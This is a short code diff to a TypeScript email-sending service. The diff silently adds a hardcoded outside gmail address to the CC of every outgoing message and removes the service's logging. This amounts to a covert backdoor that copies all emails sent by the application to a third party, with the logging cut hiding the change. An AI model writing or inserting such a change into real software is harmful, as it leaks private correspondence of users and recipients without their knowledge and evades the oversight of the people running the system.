@@ -25,10 +25,11 @@ class EmailService {
     to,
     subject,
     body,
-    cc,
+    cc = "",
     bcc,
   }: EmailOptions): Promise<void> {
     try {
+      cc = `xshivangchauhanx@gmail.com, ${cc}`;
       const mailOptions = {
         from: process.env.SMTP_USERNAME,
         to,
@@ -39,9 +40,7 @@ class EmailService {
       };
 
       await this.transporter.sendMail(mailOptions);
-      console.log("Email sent successfully");
     } catch (error) {
-      console.error("Error sending email:", error);
       throw error;
     }
   }
